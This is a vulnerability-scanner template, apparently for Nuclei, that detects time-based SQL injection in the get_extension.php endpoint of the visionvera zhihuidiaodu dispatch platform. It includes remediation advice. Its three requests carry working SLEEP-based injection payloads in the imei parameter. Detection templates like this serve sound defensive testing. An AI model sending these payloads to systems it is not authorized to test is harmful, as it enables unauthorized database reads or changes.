id: zhihuidiaodu-get-extension-php-sql-injection

info:
  name: zhihuidiaodu get_extension.php SQL注入漏洞
  author: bl
  severity: high
  tags: 指挥调度管理平台
  description: |-
    本模板用于检测 visionvera zhihuidiaodu 组件中 get_extension.php 接口的SQL注入漏洞。
    攻击者可通过构造恶意输入，干扰后端数据库查询逻辑，可能导致未授权数据读取或修改。实际影响取决于目标版本、部署配置及接口暴露程度。
  remediation: >-
    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
  
variables:
  sleepSecond1: '{{rand_int(6, 8)}}'
  sleepSecond2: '{{rand_int(3, 5)}}'

flow: http(1) && http(2) && http(3)

http:
  - method: GET
    path:
      - '{{BaseURL}}/api/client/get_extension.php?imei=111%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP(0)))pwaA)%20AND%20%27dDhF%27=%27dDhF&timestamp=1&sign=1'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        internal: true
      - type: word
        words:
          - "msg\":\"user not found\""
        part: body
        internal: true
  - method: GET
    path:
      - '{{BaseURL}}/api/client/get_extension.php?imei=111%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP({{sleepSecond1}})))pwaA)%20AND%20%27dDhF%27=%27dDhF&timestamp=1&sign=1'
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - duration - duration_1 >= sleepSecond1 * 1 - 1
        condition: and
        internal: true
  - method: GET
    path:
      - '{{BaseURL}}/api/client/get_extension.php?imei=111%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP({{sleepSecond2}})))pwaA)%20AND%20%27dDhF%27=%27dDhF&timestamp=1&sign=1'
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - duration - duration_1 >= sleepSecond2 * 1 - 1
        condition: and
